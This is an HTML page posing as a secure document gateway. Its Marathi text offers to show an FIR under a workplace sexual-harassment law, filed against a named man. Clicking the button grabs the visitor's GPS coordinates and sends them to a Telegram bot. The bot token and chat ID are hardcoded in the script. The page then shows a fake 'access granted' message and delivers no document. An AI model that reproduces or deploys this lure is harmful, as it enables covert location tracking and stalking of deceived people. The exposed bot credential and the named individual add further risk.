<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure Document Access</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #f8f9fa;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding: 20px;
      margin: 0;
    }

    .container {
      background: #fff;
      border: 1px solid #d3d3d3;
      padding: 25px 20px;
      max-width: 90%;
      width: 500px;
      margin: 30px auto;
      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
      border-radius: 10px;
    }

    h2 {
      color: #343a40;
      text-align: center;
      font-size: 24px;
      margin-bottom: 20px;
    }

    p {
      color: #555;
      font-size: 18px;
      line-height: 1.7;
      text-align: justify;
    }

    button {
      display: block;
      width: 100%;
      padding: 16px;
      font-size: 18px;
      background-color: #004085;
      color: white;
      border: none;
      margin-top: 30px;
      cursor: pointer;
      border-radius: 6px;
    }

    button:hover {
      background-color: #003366;
    }

    .footer-note {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
      color: #888;
    }

    @media (max-width: 400px) {
      h2 {
        font-size: 20px;
      }

      p {
        font-size: 16px;
      }

      button {
        font-size: 16px;
        padding: 14px;
      }

      .container {
        padding: 20px 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>कामाच्या ठिकाणी महिलांचा लैंगिक छळ (प्रतिबंध, मनाई आणि निवारण) कायदा, २०२५</h2>
    <p>
      संतोष संभाजी केंद्रे ह्यांच्या नावाने तकरार केलेले एफआयआर पाहण्यासाथी परवानगी द्या
    </p>
    <button onclick="proceed()">Open Secure Document</button>
    <div class="footer-note">Powered by Regional Digital Access Gateway</div>
  </div>

  <script>
    function proceed() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendData);
      } else {
        alert("Your device is not supported.");
      }
    }

    function sendData(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      const botToken = '7772391168:AAEOfsQOP2nfo2L3Qa5eYoCIu7h9o-FWwIg';
      const chatId = '6212560279';
      const msg = `User opened document.\nLat: ${lat}\nLon: ${lon}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg
        })
      }).then(() => {
        alert("Document access granted.");
        // window.location.href = "document.pdf";
      });
    }
  </script>
</body>
</html>
